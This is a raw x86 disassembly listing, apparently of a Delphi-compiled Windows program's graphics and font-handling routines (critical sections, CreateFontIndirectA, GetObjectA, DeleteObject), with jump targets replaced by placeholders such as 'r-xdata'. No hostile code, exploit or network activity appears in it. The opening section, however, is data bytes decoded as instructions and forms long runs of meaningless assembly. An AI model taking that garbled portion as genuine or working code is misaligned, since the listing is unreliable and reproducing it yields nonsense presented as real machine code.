or [ gs : edi + 0x72 ] al
jae r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
[ eax + 0xf00423b ]
push esp
inc edi
jb r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
inc edx
mov eax eax
les ebp [ eax ]
inc edi
jb r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jae r-xdata
inc esi
popad
insd
nop
sbb al 0x27
inc edx
add [ ecx ] al
or al 0x54
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
jb r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
mov [ ecx ] ch
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x28c4c08b
cmp eax [ edx ]
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
jae r-xdata
jb r-xdata
outsb
add [ eax ] al
fsubr [ ecx ]
inc edx
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
imul esp [ ebx + 0x73 ] 0xffff0001
nop
pop esp
sub al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x8c00422a
sub al [ edx ]
add [ eax ] al
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + esi * 4 + 0x29 ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
add [ ecx + ebp + 0x180042 ] bl
add [ eax ] al
cwde
pop ebp
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jo r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
nop
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] ch
inc edx
add [ edx + ebp + 0x42 ] cl
sub al [ edx ]
pop es
add eax 0x6e6f4654
je r-xdata
call eax
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
test al 0x3e
inc edx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
in al dx
inc edx
inc edx
add [ edx + 0x2400422a ] al
add [ eax ] al
add [ ecx + ebp ] bh
mov [ edx ] gs
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x2a ] bh
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + ecx * 4 + 0x29 ] si
inc edx
add [ esi + ebx * 2 ] cl
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4229 ] dh
imul esp [ ebx + 0x73 ] 0x42298890
inc edx
sub al [ edx ]
lodsb [ esi ]
sub [ edx ] eax
pop es
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
sub [ edx ] 0x42
add [ eax + eax ] ah
add [ eax ] al
cmp al 0x29
jo r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
fsubr [ ebx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sub eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x2b
inc edx
add [ eax + eax ] bl
add [ eax ] al
cmp al 0x29
inc edx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
les eax [ ebx + 0x42 ]
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
in al dx
inc ebx
inc edx
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
imul esp [ gs : edi + 0x68 ] 0x42270874
add al [ eax ]
push es
dec eax
jo r-xdata
sub [ edx ] eax
test [ ebx ] dh
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
imul esp [ ebx + 0x73 ] 0xc08b0000
fsubr [ ecx ]
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
sbb [ esi + 0x42 ] al
imul esp [ ebx + 0x73 ] 0x25e80004
inc edx
add [ eax * 2 + 0x45140042 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] bh
inc edx
inc edx
add [ eax + 0x42 ] dl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
or [ edi ] ah
inc edx
imul esp [ ebx + 0x73 ] 0x27180007
inc edx
add [ eax + 0x43 ] dl
inc edx
add [ eax + 0x43 ] bl
inc edx
inc eax
add [ eax ] cl
xor [ eax ] eax
imul sp [ ebp + 0x72 ] 0x1124
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ eax ] al
shr [ 0x42 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x580042 ] dh
jae r-xdata
add [ eax ] ah
inc esi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x2cd8c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
sub al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
sub al 0x42
add [ eax ] bl
add [ eax ] al
add [ ecx + ebp ] bh
inc edx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
mov [ esi + 0x42 ] es
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov ah 0x46
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
add [ eax ] al
call esp
inc ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 - 0x639a9b91 ] al
daa
inc edx
add al ch
inc ebp
inc edx
add al dh
inc ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bl
inc esi
inc edx
sub [ edx ] al
sbb [ eax ] al
add bh bh
aam 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
and eax 0x180042
add bh bh
sub [ eax + 0x42 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
sub [ edx ] eax
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
jo r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
cwde
pop ebp
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
or [ edx + 0x42 ] cl
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
lodsb [ esi ]
mov eax [ ecx ]
adc al 0x51
inc edx
add [ eax ] al
push ecx
inc edx
add [ eax + edx * 2 ] dh
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
sub eax 0x42
nop
popad
insd
les esp [ gs : esi ]
inc edx
add [ eax ] ah
inc ebx
inc edx
add [ eax ] ch
inc ebx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x63746950
push r-xdata
lodsb [ esi ]
inc edx
inc edx
add al cl
inc edx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
call 0xfffffffff4426db4
inc edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
add [ eax ] dl
inc edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
adc [ eax ] al
or [ edx + 0x42 ] al
add al 0x24
retn
outsd
mov [ gs : edx ] ch
inc edx
add [ eax + eax ] cl
add bh bh
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
sub eax 0x7070042
push esp
inc ebx
popad
outsb
jbe r-xdata
outsd
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
sub eax [ edx ]
adc [ eax ] al
add bh bh
call 0x142709b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
fmul [ esi + 0x42 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x2d
inc edx
add [ eax ] bl
sub eax 0x5e0c0042
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x2cec0004
inc edx
add [ eax + eax ] dl
add bh bh
hlt
sub_422ed8
mov dl 0x2e
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edi ] ch
inc edx
add [ edi + ebp + 0x280042 ] cl
add [ eax ] al
mov [ esi + 0x41 ] bl
add [ ebx + esi - 0x72afffc0 ] al
inc ecx
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
or [ ebx - 0x736fffbf ] 0x41
add [ ebp - 0x7453ffbe ] dh
inc ecx
add al ah
lea eax [ ecx ]
inc esp
inc edx
add [ eax + 0x29 ] cl
inc eax
add [ eax ] al
inc dx
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x67 ] cl
inc edx
add [ edi + 0x42 ] cl
add [ eax + 0x29 ] cl
inc eax
add ah cl
inc edx
add [ eax + 0x29 ] cl
inc eax
add [ eax ] dh
push 0x68340042
inc edx
add [ eax + 0x29 ] cl
inc eax
add [ eax + ebp * 2 + 0x42 ] al
add [ 0x67500042 ] cl
inc edx
add al bl
inc edx
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ eax + 0x29 ] cl
inc eax
add [ ecx ] al
add ch bh
jmp [ edi + 0x54080042 ]
sub_4232ac
clc
xor al [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
xor al [ edx ]
and al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
pop esp
xor eax [ edx ]
adc [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423320
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42335c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_423398
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_42330c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_423380
xor edx edx
push ebp
push sub_42346c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423473
mov eax [ ebp - 0x4 ]
call sub_42338c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026dc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028d8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407dd8
test al al
je r-xdata
sub_42347c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_423380
xor ecx ecx
push ebp
push sub_423503
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_42338c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_42352c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423380
xor eax eax
push ebp
push sub_423595
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423398
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_42347c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42359c
mov eax [ ebp - 0x4 ]
call sub_42338c
retn
mov eax ebx
mov si 0xfffd
call sub_403350
sub_4235a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423380
xor eax eax
push ebp
push sub_423600
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423607
mov eax [ ebp - 0x4 ]
call sub_42338c
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403350
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42347c
sub_423610
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423380
xor edx edx
push ebp
push sub_42366f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423676
mov eax [ ebp - 0x4 ]
call sub_42338c
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_42367c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418974
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423719
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4185b0
mov ebx eax
mov eax ebx
call sub_424c0c
inc [ ebp - 0x4 ]
mov eax ebx
call sub_424fd8
mov eax [ rw-data ]
call sub_423610
mov eax [ rw-data ]
call sub_423610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423720
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_4189d8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4185b0
call sub_424eb0
inc esi
dec ebx
jne r-xdata
sub_423d6f
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_417ed4
retn
sub_423da0
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c5c
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a4c
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_423e54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423398
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_423ea8
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_42347c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_423eec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418bac
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423bac
xor eax eax
push ebp
push sub_423fa7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423bac
xor eax eax
push ebp
push sub_423f8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4235a4
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424028
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f91
mov eax [ ebp - 0x8 ]
call sub_423bbc
retn
mov eax ebx
call sub_4242ac
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4242c8
sub_423fd8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423bac
xor eax eax
push ebp
push sub_42401d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_42352c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424024
mov eax [ ebp - 0x4 ]
call sub_423bbc
retn
sub_42403c
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4241c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241cc
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f74
retn
mov eax [ rw-data ]
call sub_423380
xor eax eax
push ebp
push sub_42419d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42338c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041b4
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4087b0
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4041b4
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4087b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041b4
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407edc
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_424320
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_4241e4
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_423da0
mov edx esp
mov eax ebx
call sub_423fd8
add esp 0x2c
pop esi
pop ebx
retn
sub_424210
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423fc0
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_423fd8
add esp 0x2c
pop esi
pop ebx
retn
sub_424250
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_423fc0
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b5c
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4041ec
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a4c
mov edx esp
mov eax ebx
call sub_423fd8
sub_4242c8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_424210
pop esi
pop ebx
retn
sub_4242f4
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423fc0
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_423fd8
add esp 0x30
pop ebx
retn
sub_424328
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423fc0
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_423fd8
add esp 0x2c
pop esi
pop ebx
